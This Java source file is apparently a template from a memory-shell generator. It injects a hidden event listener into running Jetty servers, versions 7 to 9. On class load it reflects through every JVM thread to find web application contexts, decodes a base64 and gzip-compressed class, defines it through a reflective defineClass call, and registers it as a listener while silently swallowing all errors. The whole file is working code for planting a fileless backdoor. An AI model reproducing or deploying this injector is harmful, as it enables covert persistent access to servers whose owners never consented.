package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.EventListener;
import java.util.List;
import java.util.zip.GZIPInputStream;

/**
 * tested v7、v8、v9
 */
public class JettyListenerInjectorTpl {

        public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
}

    static {
        new JettyListenerInjectorTpl();
    }


    public JettyListenerInjectorTpl() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object listener = getListener(context);
                addListener(context, listener);
            }
        } catch (Exception e) {

        }

    }

    List<Object> getContext() {
        List<Object> contexts = new ArrayList();
        Thread[] threads = Thread.getAllStackTraces().keySet().toArray(new Thread[0]);
        for (Thread thread : threads) {
            try {
                Object contextClassLoader = getContextClassLoader(thread);
                if (isWebAppClassLoader(contextClassLoader)) {
                    contexts.add(getContextFromWebAppClassLoader(contextClassLoader));
                } else if (isHttpConnection(thread)) {
                    contexts.add(getContextFromHttpConnection(thread));
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private Object getContextClassLoader(Thread thread) throws Exception {
        return invokeMethod(thread, "getContextClassLoader");
    }

    private boolean isWebAppClassLoader(Object classLoader) {
        return classLoader.getClass().getName().contains("WebAppClassLoader");
    }

    private Object getContextFromWebAppClassLoader(Object classLoader) throws Exception {
        Object context = getFV(classLoader, "_context");
        Object handler = getFV(context, "_servletHandler");
        return getFV(handler, "_contextHandler");
    }

    private boolean isHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    return true;
                }
            }
        }
        return false;
    }

    private Object getContextFromHttpConnection(Thread thread) throws Exception {
        Object threadLocals = getFV(thread, "threadLocals");
        Object table = getFV(threadLocals, "table");
        for (int i = 0; i < Array.getLength(table); ++i) {
            Object entry = Array.get(table, i);
            if (entry != null) {
                Object httpConnection = getFV(entry, "value");
                if (httpConnection != null && httpConnection.getClass().getName().contains("HttpConnection")) {
                    Object httpChannel = invokeMethod(httpConnection, "getHttpChannel");
                    Object request = invokeMethod(httpChannel, "getRequest");
                    Object session = invokeMethod(request, "getSession");
                    Object servletContext = invokeMethod(session, "getServletContext");
                    return getFV(servletContext, "this$0");
                }
            }
        }
        throw new Exception("HttpConnection not found");
    }

    public ClassLoader getWebAppClassLoader(Object context) throws Exception {
        try {
            return ((ClassLoader) invokeMethod(context, "getClassLoader"));
        } catch (Exception e) {
            return ((ClassLoader) getFV(context, "_classLoader"));
        }
    }

    private Object getListener(Object context) throws Exception {
        Object listener = null;
        ClassLoader classLoader = getWebAppClassLoader(context);
        try {
            listener = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return listener;
    }

    public static void addListener(Object context, Object listener) {
        try {
            if (isInjected(context, listener.getClass().getName())) {
                return;
            }

            invokeMethod(context, "addEventListener", new Class[]{EventListener.class}, new Object[]{listener});
        } catch (Exception e) {
        }
    }


    public static boolean isInjected(Object context, String className) throws Exception {

        try {
            // jetty v8、 v9
            EventListener[] eventListeners = (EventListener[]) invokeMethod(context, "getEventListeners");
            for (int i = 0; i < eventListeners.length; i++) {
                if (eventListeners[i].getClass().getName().contains(className)) {
                    return true;
                }
            }
        } catch (Exception e) {
        }

        return false;
    }


    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
